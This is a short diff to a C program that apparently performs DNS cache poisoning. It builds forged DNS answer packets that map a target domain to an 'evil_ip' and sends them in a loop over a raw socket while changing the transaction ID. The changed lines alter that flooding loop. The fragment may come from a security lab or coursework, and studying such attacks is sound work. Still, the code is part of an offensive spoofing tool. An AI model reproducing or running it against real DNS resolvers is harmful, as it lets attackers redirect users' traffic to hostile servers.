@@ -479,9 +479,15 @@ int main(int argc, char *argv[])
     packet_len = generate_dns_answer(target_domain_nameserver_ip, dst_ip, query, evil_ip, buffer, &txid_ptr);
 
     printf("Sending flood answer packets...\n");
-    if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-        printf("packet send error %d which means %s\n",errno,strerror(errno));
+    for(int i = 0; i < 2; i++) {
+        if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+            printf("packet send error %d which means %s\n",errno,strerror(errno));
+        }
+        printf("Sent!\n");
+
+        *txid_ptr = -1;
     }
+    
 
     close(sd);
     return 0;
